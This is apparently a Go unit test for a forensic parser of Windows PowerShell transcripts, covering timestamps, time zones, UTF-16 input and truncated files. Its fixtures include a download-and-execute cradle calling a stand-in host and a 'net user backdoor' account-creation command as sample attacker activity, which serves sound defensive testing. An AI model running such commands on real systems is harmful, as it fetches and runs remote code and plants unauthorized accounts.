package parsers

import (
	"strings"
	"testing"
	"time"

	"github.com/DanDreadless/atropos/internal/timeutil"
)

const transcriptHead = "**********************\r\n" +
	"Windows PowerShell transcript start\r\n" +
	"Start time: 20240117212000\r\n" +
	"Username: WS-1\\alice\r\n" +
	"RunAs User: WS-1\\alice\r\n" +
	"Configuration Name: \r\n" +
	"Machine: WS-1 (Microsoft Windows NT 10.0.19045.0)\r\n" +
	"Host Application: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile\r\n" +
	"Process ID: 4321\r\n" +
	"PSVersion: 5.1.19041.3803\r\n" +
	"**********************\r\n"

const transcriptTail = "**********************\r\n" +
	"Windows PowerShell transcript end\r\n" +
	"End time: 20240117212500\r\n" +
	"**********************\r\n"

func TestPowerShellTranscript(t *testing.T) {
	// With invocation headers: each command has its own time.
	doc := transcriptHead +
		"Transcript started, output file is C:\\Users\\alice\\t.txt\r\n" +
		"**********************\r\n" +
		"Command start time: 20240117212005\r\n" +
		"**********************\r\n" +
		"PS C:\\Users\\alice> whoami /priv\r\n" +
		"ws-1\\alice\r\n" +
		"**********************\r\n" +
		"Command start time: 20240117212130\r\n" +
		"**********************\r\n" +
		"PS C:\\Users\\alice> IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')\r\n" +
		"PS>\r\n" +
		// Output that looks like a prompt (an old transcript printed) is not a
		// command: with headers on, every command has its block.
		"PS C:\\old> Get-Process\r\n" +
		"**********************\r\n" +
		"Command start time: 20240117212459\r\n" +
		"**********************\r\n" +
		"PS C:\\Users\\alice> Stop-Transcript\r\n" +
		transcriptTail
	london, _ := time.LoadLocation("Europe/London")
	r := run(t, write(t, "t.txt", []byte(doc)), func(c *Context) {
		c.Host = "WS-1"
		c.Local = timeutil.LocalContext{Loc: london, ZoneFrom: timeutil.ZoneHost, ZoneName: "Europe/London"}
	})
	if r.err != nil || len(r.warns) != 0 || len(r.events) != 5 {
		t.Fatalf("err=%v warns=%v events=%d", r.err, r.warns, len(r.events))
	}
	s := r.events[0]
	if s.Type != "powershell-transcript-started" || utc(s) != "2024-01-17T21:20:00Z" || s.Stamp.ZoneFrom != timeutil.ZoneHost || s.User != `WS-1\alice` ||
		s.Category != CatExecution || s.Fields["process_id"] != "4321" || s.Fields["machine"] != "WS-1 (Microsoft Windows NT 10.0.19045.0)" ||
		!strings.Contains(s.Message, "powershell.exe -NoProfile") || s.Host != "WS-1" {
		t.Errorf("start: %s %+v", utc(s), s)
	}
	c := r.events[2]
	if c.Type != "powershell-command" || utc(c) != "2024-01-17T21:21:30Z" || c.User != `WS-1\alice` ||
		c.Fields["command"] != "IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')" || !strings.Contains(c.Ref, "line 21") {
		t.Errorf("command: %s %+v", utc(c), c)
	}
	if e := r.events[4]; e.Type != "powershell-transcript-ended" || utc(e) != "2024-01-17T21:25:00Z" {
		t.Errorf("end: %s %+v", utc(e), e)
	}
	if !strings.Contains(r.text, "DownloadString") || r.facts["powershell.transcript"] != "1 session(s), 3 command(s) with a time, 0 without" || len(r.notes) != 0 {
		t.Errorf("text or fact: %q, notes %q", r.facts["powershell.transcript"], r.notes)
	}

	// Without them, commands are text only, and the transcript says so. In
	// summer the same wall-clock reading is an hour earlier in UTC.
	doc = strings.ReplaceAll(transcriptHead, "20240117", "20240717") + "PS C:\\> net user backdoor P@ss /add\r\nThe command completed successfully.\r\nPS C:\\> exit\r\n" +
		strings.ReplaceAll(transcriptTail, "20240117", "20240717")
	r = run(t, write(t, "t2.txt", append([]byte{0xEF, 0xBB, 0xBF}, doc...)), func(c *Context) {
		c.Local = timeutil.LocalContext{Loc: london, ZoneFrom: timeutil.ZoneHost, ZoneName: "Europe/London"}
	})
	if r.err != nil || len(r.events) != 2 || utc(r.events[0]) != "2024-07-17T20:20:00Z" || utc(r.events[1]) != "2024-07-17T20:25:00Z" {
		t.Fatalf("err=%v events=%d", r.err, len(r.events))
	}
	if len(r.notes) != 1 || !strings.Contains(r.notes[0], "2 commands in this transcript have no time of their own") || !strings.Contains(r.text, "backdoor") {
		t.Errorf("notes %q", r.notes)
	}
	// No zone known: the times are flagged as assumed.
	r = run(t, write(t, "t3.txt", []byte(doc)), nil)
	if len(r.events) != 2 || r.events[0].Stamp.ZoneFrom != timeutil.ZoneAssumed {
		t.Errorf("assumed zone: %+v", r.events)
	}
	// As PowerShell writes it on some systems: UTF-16.
	r = run(t, write(t, "t4.txt", append([]byte{0xFF, 0xFE}, wide(doc)...)), nil)
	if r.err != nil || len(r.events) != 2 {
		t.Errorf("utf-16: err=%v events=%d", r.err, len(r.events))
	}
	// Cut anywhere, it must end without a panic; a header with no usable
	// time falls back to ordinary text handling.
	for n := 0; n < len(doc); n += 11 {
		run(t, write(t, "cut.txt", []byte(doc[:n])), nil)
	}
	r = run(t, write(t, "bad.txt", []byte(strings.ReplaceAll(doc, "2024071721", "notatime"))), nil)
	if len(r.events) != 0 {
		t.Errorf("a transcript with no readable time gave %d events", len(r.events))
	}
}
